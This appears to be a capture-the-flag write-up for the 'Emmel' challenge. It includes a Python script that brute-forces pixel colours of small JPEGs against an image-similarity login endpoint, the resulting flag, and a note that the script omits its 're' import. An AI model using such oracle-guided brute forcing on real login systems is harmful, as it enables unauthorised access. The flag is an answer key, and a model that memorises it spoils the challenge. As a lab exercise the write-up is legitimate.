# Emmel

> Points: 1222 [2000]

## Description

> Investigators have found a curious login page on a server belonging to COViD. Can you get past the login screen?
>
> [Login Page](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:40751/)

## Solution
The approach to this challenge was to create a picture that was most similar to the image being stored on the server. 

Initially we uploaded quite a few pictures but did not manage to obtain more than 50%. 

Hence, we wrote a script to brute force all rgb for a single pixel however that did not work as well.

As such we wrote a script that bruteforces rgb for a 4 pixels and that manage to work.

Submitting [40.jpg](40.jpg) gave us the flag `govtech-csg{I_L0V3_G00D_D0GG0S!}`

```python
from requests import post
from PIL import Image
color =[]

for i in range(0,256):
    img = Image.new('RGB',(2,2),color=(0,0,0))
    img.putpixel((0,0),(255,43,0))
    img.putpixel((0,1),(17,2,2))
    img.putpixel((1,0),(1,i,0))
    img.save("{}.jpg".format(i))
    files = {'file': open('{}.jpg'.format(i),'rb')}
    url = "http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:40751/recognize"
    r = post(url, files=files)
    reg = re.findall(r"Similarity: (.*)%", r.text)
    if reg:
        val = float(reg[0])
        color.append((val,i))
    else:
        print(r.text)
        print(i)
        break;  
color.sort(reverse=True)
print(color[:5])
```

## Fun fact
After obtaining the flag we saw the floating dogos. Apparently that picture if converted to jpg could also solve the challenge LMAO
Try it yourself! It's in [dogos.jpg](dogos.jpg)
## Flag
`govtech-csg{I_L0V3_G00D_D0GG0S!}`
